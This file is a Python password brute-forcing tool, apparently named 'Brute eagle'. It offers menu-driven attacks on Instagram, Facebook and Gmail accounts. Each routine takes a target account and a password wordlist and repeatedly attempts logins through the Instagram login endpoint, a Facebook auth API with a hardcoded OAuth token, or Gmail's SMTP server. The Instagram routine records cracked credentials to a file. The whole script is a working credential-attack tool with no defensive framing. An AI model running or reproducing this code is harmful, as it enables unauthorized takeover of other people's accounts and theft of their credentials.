from __future__ import absolute_import
from __future__ import print_function
from datetime import datetime
import re
from splinter import Browser
import mechanize
import smtplib
import random
import smtplib
import requests
import threading
import subprocess
import time
import sys
import os
from random import randint
from six.moves import input
CheckVersion = str(sys.version)

os.system("git pull")

os.system("figlet Brute eagle")

print("\n")
print("1.Instagram bruteforce \n2.Facebook bruteforce \n3.Gmail bruteforce \n4.exit \n\nSelect the number you want and type it and press enter.")
number = int(input("Enter the number : "))

if number == 1:
    os.system("clear")
    os.system("figlet white insta")
    print("================================================================")
    print("\033[32mTool author  : white-eagle\033[0m")
    print("\033[33mGithub       : https://github.com/WH1T3-E4GL3/\033[0m")
    print("\033[33mTelegram     : https://t.me/Ka_KsHi_HaTaKe\033[0m\n")
    print("================================================================")
    print("\033[33mThe working of this tools may depend on your vpn. so you mac can use  it before running this tool.\033[0m\n")

    class InstaBrute(object):

        def __init__(self):

            try:
                user = input('Enter targets instagram username : ')
                print('\033[33mJust type whiteagle.txt and press enter below if you dont have a custom wordlist, or if you have a wordlist type its path\033[0m\n')
                Combo = input('passeord list path : ')
                print('\n----------------------------')

            except:
                print(' The tool was forced to exit ')
                sys.exit()

            with open(Combo, 'r') as x:
                Combolist = x.read().splitlines()
            thread = []
            self.Coutprox = 0
            for combo in Combolist:
                password = combo.split(':')[0]
                t = threading.Thread(target=self.New_Br, args=(user, password))
                t.start()
                thread.append(t)
                time.sleep(0.9)
            for j in thread:
                j.join()

        def cls(self):
            linux = 'clear'
            windows = 'cls'
            os.system([linux, windows][os.name == 'nt'])

        def New_Br(self, user, pwd):
            link = 'https://www.instagram.com/accounts/login/'
            login_url = 'https://www.instagram.com/accounts/login/ajax/'

            time = int(datetime.now().timestamp())

            payload = {
                'username': user,
                'enc_password': '#PWD_INSTAGRAM_BROWSER:0:{time}:{pwd}',
                'queryParams': {},
                'optIntoOneTap': 'false'
            }

            with requests.Session() as s:
                r = s.get(link)
                csrf = re.findall(r"csrf_token\":\"(.*?)\"", r.text)[0]
                r = s.post(login_url, data=payload, headers={
                    "User-Agent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36",
                    "X-Requested-With": "XMLHttpRequest",
                    "Referer": "https://www.instagram.com/accounts/login/",
                    "x-csrftoken": csrf
                })
                print(f'{user}:{pwd}\n----------------------------')

                if 'authenticated": true' in r.text:
                    print(('' + user + ':' + pwd + ' --> SUCCESSFULL '))
                    with open('good.txt', 'a') as x:
                        x.write(user + ':' + pwd + '\n')
                elif 'two_factor_required' in r.text:
                    print(('' + user + ':' + pwd +
                          ' -->  TWO FACTOR AUTH REQUIRED '))
                    with open('results_NeedVerfiy.txt', 'a') as x:
                        x.write(user + ':' + pwd + '\n')
    InstaBrute()


elif number == 2:
    os.system("clear")
    os.system("figlet white book")
    print("=======================================================================")
    print("\033[32mTool author  : white-eagle\033[0m")
    print("\033[33mGithub       : https://github.com/WH1T3-E4GL3/\033[0m")
    print("\033[33mTelegram     : https://t.me/Ka_KsHi_HaTaKe\033[0m\n")
    print("=======================================================================")
    
    print("\n")
    

    # Simple code with asking-mode
    print('\033[33mEdit the whiteusers.txt file by "nano whiteusers.txt" and add usernames there and just tpe whiteusers.txt below and enter or you can create your own user list and give path\033[0m\n')
    emailList = raw_input('Enter Usernames File: ') if sys.version_info[0] == 2 else str(
        input('Enter Usernames File: '))
    print('\033[33mJust type whiteagle.txt and press enter below if you dont have a custom wordlist, or if you have a wordlist type its path\033[0m\n')
    passList = raw_input('Enter Passwords File: ') if sys.version_info[0] == 2 else str(
        input('Enter Passwords File: '))

    # Open lists
    loop_email = open(emailList, 'r').read().splitlines()
    loop_pass = open(passList, 'r').read().splitlines()

    # looping
    for email in loop_email:
        for password in loop_pass:
            request = requests.post('https://b-api.facebook.com/method/auth.login', headers={'Authorization': 'OAuth 200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16'}, data={
                                    'data': 'json', 'email': email, 'password': password, 'credentials_type': 'password'}).status_code
            if request == 200 or request == 405:
                print("Cracking : ("+email+":"+password+")")
            elif request == 401:
                print("Failed : ("+email+":"+password+")")
            elif request == 404:
                print("not found : ("+email+")")
            else:
                print("Error")


elif number == 3:
    os.system("clear")
    os.system("figlet white mail")
    print("===============================================================")
    print("\033[32mTool devoloped : white-eagle\033[0m")
    print("\033[33mGithub : https://github.com/WH1T3-E4GL3/\033[0m")
    print("\033[33mTelegram : https://t.me/Ka_KsHi_HaTaKe\033[0m\n")
    print("================================================================")
    print("\n")

    smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
    smtpserver.ehlo()
    smtpserver.starttls()
    user = input("Enter target email id: ")
    print("                                   ")
    print('\033[33mJust type whiteagle.txt and press enter below if you dont have a custom wordlist, or if you have a wordlist type its path\033[0m\n')
    passwf = input("Enter password file: ")
    print("                                   ")
    passwf = open(passwf, "r")
    for password in passwf:
        try:
            smtpserver.login(user, password)
            print("Voila! password found: %s" % password)
            print("                                   ")
            break
        except smtplib.SMTPAuthenticationError:
            print(" password not found %s" % password)
            print("                                   ")
            
elif number == 4:
	os.system("exit")

else:
    print("\033[91mINVALID OPTION PLEASE ENTER THE CORRECT NUMBER FROM ABOVE\033[0m")

